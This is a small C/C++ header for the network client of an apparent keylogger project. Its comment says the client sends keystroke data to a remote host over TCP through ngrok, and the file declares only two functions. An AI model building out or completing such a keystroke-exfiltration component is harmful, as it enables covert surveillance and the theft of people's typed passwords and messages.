/*-------------------------------------------------------------------

*   ``~ Header file for client network code (Written by haeoro) ~``
*
*   client() creates a TCP connection over the internet with the help of ngrok to share
*   keystroke data remotely.
*
*   isHostInDotForm() checks if the HOST const in ks2server.cpp is in IPv4 format. 

-------------------------------------------------------------------*/

#pragma once

int isHostInDotForm();
int client(const char *buf);